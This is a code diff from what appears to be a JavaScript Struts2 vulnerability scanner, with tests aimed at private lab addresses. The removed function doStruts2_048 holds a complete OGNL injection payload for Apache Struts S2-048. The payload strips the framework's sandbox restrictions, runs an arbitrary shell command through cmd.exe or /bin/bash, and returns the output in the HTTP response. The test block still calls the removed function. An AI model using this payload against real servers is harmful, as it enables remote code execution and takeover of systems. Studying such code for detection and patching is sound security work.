@@ -263,37 +263,6 @@ function doStruts2_033(url)
     	fnDoBody(b,"s2-033",szOldUrl);
     });
 }
-// integration/saveGangster.action
-function doStruts2_048(url,fnCbk)
-{
-	var szOldUrl = url;
-	if('/' == url.substr(-1))url = url.substr(0,url.length - 1);
-	this.name = this.name || "name";
-
-	var payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." + 
-		"(#_memberAccess?(#_memberAccess=#dm):" + 
-		"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." + 
-		"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" + 
-		".(#ognlUtil.getExcludedPackageNames().clear())"+ 
-	 	".(#ognlUtil.getExcludedClasses().clear())" + 
-		".(#context.setMemberAccess(#dm))))" + 
-		".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))" + 
-		".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))" + 
-		".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))" + 
-		".(#process=#p.start())"
-		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
-		// + ".(#response.addHeader('struts2','_struts2_'))"
-		+".(#ros=#response.getOutputStream())" + 
-		".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
-    var data = {"age": 20};
-    data[this.name] = g_postData || payload;
-    request(fnOptHeader({method: 'POST',uri: url,"formData":data,"headers":{Referer:url}}),
-    	function(e,r,b)
-    {
-    	fnDoBody(b,"s2-048",szOldUrl);
-    	// console.log(e || b || r);
-    });
-}
 
 function myLog(a)
 {
@@ -1336,6 +1305,7 @@ if(program.test)
 	doStruts2_019.call({name:null},"http://192.168.10.216:8088/S2-019/example/HelloWorld.action");
 	doStruts2_029.call({name:null},"http://192.168.10.216:8088/S2-029/default.action");
 	
+	runChecks("http://192.168.10.216:8082/s2-048/integration/saveGangster.action","struts2,048");
 	runChecks("http://192.168.10.216:8082/s2-046/doUpload.action","struts2,046");
 	doStruts2_048.call({name:null},"http://192.168.10.216:8082/s2-048/integration/saveGangster.action");
 	doStruts2_053.call({name:null},"http://192.168.10.216:8082/s2-053/");
